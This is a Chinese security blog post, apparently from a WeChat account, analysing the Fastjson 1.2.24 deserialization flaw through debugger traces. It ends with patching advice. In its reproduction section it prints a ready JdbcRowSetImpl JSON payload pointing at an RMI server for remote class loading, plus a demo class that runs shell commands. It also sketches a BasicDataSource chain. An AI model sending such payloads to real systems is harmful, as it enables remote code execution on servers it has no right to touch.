<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6J8DqNs2eyDXyqSCVe76hw)

> “A9 Team 甲方攻防团队，成员来自某证券、微步、青藤、长亭、安全狗等公司。成员能力涉及安全运营、威胁情报、攻防对抗、渗透测试、数据安全、安全产品开发等领域，持续分享安全运营和攻防的思考和实践。”

01

—

**前言**

  

Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。

Fastjson 是个非常流行的库，出现了漏洞造成的危害也特别大。json 直白来说就是一串字符串，最原始的需求就是把键值对提取出来，作为一个 json 解析的库，可能很多人都会好奇它为什么会有代码执行之类的功能。本篇文章主要分析 Fastjson 产生代码执行漏洞的原因，和 fastjson 漏洞的执行过程。

02

—  

**Fastjson 反序列化原理分析  
**

首先先来搭建环境，在 pom.xml 中导入 fastjson 的依赖，这里先导入发现的版本 1.2.24：  
  

```
<dependency>
     <groupId>com.alibaba</groupId>
     <artifactId>fastjson</artifactId>
     <version>1.2.24</version>
</dependency>

```

可以看到，这个库主要是用来做字符串解析的工作

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNJLuE2GbnTKSEHSzmibOB6ic8Aic9a38v6RibAuTibDiaBuP0MF7thrRQvZew/640?wx_fmt=png)

一个 json 库肯定不满足这个最简单的功能，很多开源的包都想要支持的功能足够多。fastjson 支持将字符串反序列化成 JavaBean，试一下效果，写一个 Person 类。

  

```
public class Person {
    private int age;
    private String name;
    public Person() {
        System.out.println("constructor");
    }
    public void getAge(int age) {
        System.out.println("getAge");
        this.age = age;
    }
    public void setAge(int age) {
        System.out.println("setAge");
        this.age = age;
    }
    public String getName() {
        System.out.println("getName");
        return name;
    }
    public void setName(String name) {
        System.out.println("setName");
        this.name = name;
    }
}

```

可以看到 fastjson 实例化一个对象，调用了构造函数，也会根据传入的值，调用 set 方法赋给这个对象。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNwFdEAlLLicsKuiamknoEKxub4mJHTwegVnus3tGAJmzvgo7I6qstrlAg/640?wx_fmt=png)

这种方法其实也没有安全问题，因为它指定了对象的类型，这里我们只能反序列化成 Person 对象。但是 fastjson 有一个特性，根据你传入的不同字符串，去反序列化成不同的类。

如下面这个例子，fastjson 根据传入的字符串，按照 Person 类，解析、实例化、赋值、调用这些过程全部走了一遍，set 和 get 方法全都调用了。这个参数不是服务端控制反而是客户端能去控制的，这个行为听上去特别像一句话木马，传入不同的字符串就能执行不同的代码。设计上看特别像后门。

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNncTE5qROUQYG8g85INgyAh5gfy9V6kic05PR38zVPOIom9ZHIPGum2g/640?wx_fmt=png)

这就是 fastjson 提供的一个功能，这个功能就导致了后续的一系列问题。

断点看看调用流程，首先调用一个接受 string 的 parseObject 方法，实际上调用 parse 方法后返回的就是 Person 对象

字符串传进去会调用 DefaultJSONParser 进行解析，这个 features 参数可以指定解析时的一些要求，比如能否使用单引号，空格如何处理等规则。

  

。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNqCXB6jEeqrQRCojWBrqfuuzqr3iavy4c8VvU9eV8khEtC7CFZAscoug/640?wx_fmt=png)

接下来就 parser 去进行解析，JSON 解析就是字符串挨个去匹配，这里是 switch 来匹配

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNHt4iaAfeppAeaJLQPowKww5zYmnWuEocxNtoib29WXDYAvz46uY4vGOA/640?wx_fmt=png)

读到 key 之后，会判断 key 值是不是特殊字符，如果匹配到`DEFAULT_TYPE_KEY`，也就是 @type，就会进行 java 的反序列化，不仅仅是 json 的反序列化。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNyFbqIIIqFpZUXeAkA38micg3BgsYQFjfNv0ib8BA2n286AO8hqlrLicfA/640?wx_fmt=png)

如果是 @type 就会加载 loadClass 这个方法，看 1000 行，首先会从缓存里面找，然后经过一系列的处理，总之就是获取上下文的 ClassLoader，然后将它放在缓存里。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZN4Gy5zWZWVcDPkY4K2noesPY5LibBfcGBsWd2Lzj0a98rNmm6K7mYqQg/640?wx_fmt=png)

接下来就进入到了解析 java 对象的环节，首先获取反序列化器，第二步用反序列化器来进行反序列化，这一步做完回来的就是 Person 了。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNVicgfUhWzeoUkaxiahlIPtIH38wFy318sPpN6mduRaSnH1ugel07WkKA/640?wx_fmt=png)

我们来看看 fastjson 是如何进行反序列化的，它的构造里有很多内置类对应的反序列化器。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNgVR0rJiaW8URbcIehHqbMn7ia2vibibo1veXoO7jEKH17hxWickUUVAibKnw/640?wx_fmt=png)

最后也是一堆判断，判断都不满足的话，就会按照 javeBean 来解析

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZN3gqGoibKNUl1ialEBs3QeU3B5cVAWJgic77F4lib7XXQLOriaDcAUtQLX8Q/640?wx_fmt=png)

进入到 createJavaBeenDeserializer 这个方法中，有一个 JaveBeanInfo 的函数，它在创建类对应的反序列化器的时候，把类里面的构造函数，getter，setter 都获取，组成一个 beaninfo

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNlpf2AF0yCjNYILcnicdXfbUKwRFHJeTHoEmk54WtRyvBPyd7gTrFNMQ/640?wx_fmt=png)

进入 build 方法，可以看到这里获得了所有的字段

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNEicNZXTacm9frkgM6HeoeOrLJz8xdIbJm4WicHAQJuc7JIkaAZ6zAtLg/640?wx_fmt=png)

接着往下走，会经过几个遍历，第一遍遍历是找所有的 setter 方法，第二遍遍历是找所有 public 或者 static 的 Field，第三遍遍历是找所有满足条件的 getter（Map、Collection 等等）

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNjpgKPSBsib3W1gCiaerYOWTdCMzXHAGcRrJ6ViajPicrwWhfJ51ib33S6fw/640?wx_fmt=png)

进入一个遍历看一下，条件是长度大于 4，不是 Static，返回值是 Void

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNkTqMDic8YLQ4Z01kRAB8nOl0KY94OAeU0CW4BYhOendQz2oO1mwBfTg/640?wx_fmt=png)

遍历以后可以看到 beaninfo 已经有了我们要的字段，同时这个字段对应的 set 方法也获得到了

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNzmf53wvhiaTjf4dresicib0Y8XFpDBW39OBfA6iaMOVWtY892I1sojKTicw/640?wx_fmt=png)

调用构造函数之后，通过 setValue 完成赋值，调用 set 方法

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZN8ibXicKiaBNMukJwZCsFLn3dMicHQDHickTic16R7W7QoYibBHKGfXiamgF6YA/640?wx_fmt=png)

前面我们看到还会调用 getter 方法，这个在哪调用了呢？可以看到，前面把字符串 json 转换成了对象，这里还会把 json 对象转换成 json 字符串，在这里调用了 getter。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNkkQb7LhWqhLq1015ibg2QsqtflcuVCZywqsVEjh2Nu86Hjd8UkuOUmw/640?wx_fmt=png)

可以看到这里就调用了 invoke，执行调用了 getAge 方法。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNRDKd7J8dgPZu46CFQOLfGlGFXRiaibPJhgUQsZsUyTS6ibVHwBicdq3YKQ/640?wx_fmt=png)

总结一下流程：fastjson 解析的时候，会用反序列化器进行解析，调用构造方法，赋值的时候通过 setter 方法进行赋值。用了 parseObject 方法，会调用 toJSON 方法，把所有的 getter 方法都调用一遍。

知道了代码的调用流程以后，漏洞利用的点就显而易见了。

找到一个 setXXX 函数，这个函数里有危险方法，就可以作为 fastjson 的攻击链了。

举一个例子，假设有一个危险类 test

```
public class test {
    public void setCmd(String cmd) throws IOException {
        Runtime.getRuntime().exec(cmd);
    }
}

```

运行，成功利用！![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNeiazoEmVAE5Z6Xe644SvVnE1e1vH1BEIy7rhYw65dWBFz2HBnWEhB4w/640?wx_fmt=png)

  

03

—**  
Fastjson1.2.24 漏洞复现  
**

这个版本主要有两条链子，一条是基于 JdbcRowSetImpl 的链子，另一条是基于 BasicDataSource 的链子。

先来看 JdbcRowSetImpl 这一条链子，看到是标准 jndi 注入的攻击方式，并且满足变量`DataSource`可控，有对应的 setter 方法。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNWlZlLWsF6p8NOVT7zwdWe9veQLkH8wfPEa2y956xRRkIZ1UDXqWJzg/640?wx_fmt=png)

实际的利用需要自己先启动一个 Server，然后把恶意类放到 vps 上。这里为了方便，我们可以通过 Yaki 建一个反连服务器，设置 Payload。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNkwIfW7x5uByjty3QpSmhbak8hIe4XJ1CO5g7aYdb0OJuibsaibt7wQ9w/640?wx_fmt=png)

成功验证，直接执行了 clac，还是很方便的。

这条链子是 JNDI 注入，会受版本限制、依赖限制，并且需要出网外联。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNE6vPv57iaavvLwx6PVUWZApulTXtKOQ8pIW3nswkgnGURian7KEzZr3A/640?wx_fmt=png)

在真实的环境中，只需要将请求的 JSON 字符串改成精心制造的即可。

```
{
"@type":"com.sun.rowset.JdbcRowSetImpl",
"dataSourceName":"rmi://127.0.0.1:8899/Exploit", "autoCommit":true
}

```

`JdbcRowSetImpl`这条链子可以理解为远程的动态类加载，接下来要讲的`BasicDataSource`这条链是本地类加载。

这条链子目标需要引入 tomcat 依赖，还算是比较常见。

BCEL 作为字节码传入`new ClassLoader().loadClass(code).newInstance()；`将会被实例化，当我们在 Fastjson 反序列化中构造出这种链，将会造成反序列化漏洞

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNQMKknnNtZWRia1Ribj2MKEdJUicc6MBJnKw9z9wibJqRbULnfxsSRtRQYg/640?wx_fmt=png)

想要在 Fastjson 中利用的话，需要 fastjson 反序列化过程中执行到这个操作。而在 BasicDataSource 中正好有一个能够利用的点。其中`driverClassLoader`和`driverClassName`都是可控的。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNOn6K1bw4p2icUcDmLsI5fENp6o90JWqk16XROR9dqwibeiaWBhEWtkNGA/640?wx_fmt=png)

往上查找引用，能在`getConnetcion`方法中看到调用

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNPEzUwb7Ya6Pr19cyyQClso6uyh2efzDJExLoM6u6aPUZp0WBL6KGwQ/640?wx_fmt=png)

构造 Payload，成功执行执行命令。

![图片](https://mmbiz.qpic.cn/mmbiz_png/hKrHuQPHice6icc8bgjkMfDWjZLWenqSZNa3FSgzwy0oMlzIJ9mbPibTgdXmYHNlibSkY2bibzjpvenCwM9ZUQu4kmg/640?wx_fmt=png)

这一条链子主要是不出网的打法，不需要开启特殊的参数，适用范围较广。还有一条 TemplatesImpl 链子，需要开启`Feature.SupportNonPublicField`，实战中适用范围较小，此处不展开分析。

03

—  

**修复建议  
**

1. 升级 Fastjson 至最新安全版本

2. 配置 AutoType 黑白名单

04

—

**小结**

本章浅谈了 FastJson 产生漏洞的原因，并走了 Fastjson 在低版本常见的两条利用链。Fastjson 的漏洞核心其实就是可以加载任意类，所以后续的版本也是一直在完善黑名单，大佬们不断加以亿点点的技巧，用不可能的姿势完成新版本利用。

受限于篇幅，未能对已公开的几种 gadget 进一步的分析复现。希望本文能起到抛砖引玉的作用，如有错误之处，欢迎各位师傅们指点交流，不胜感激。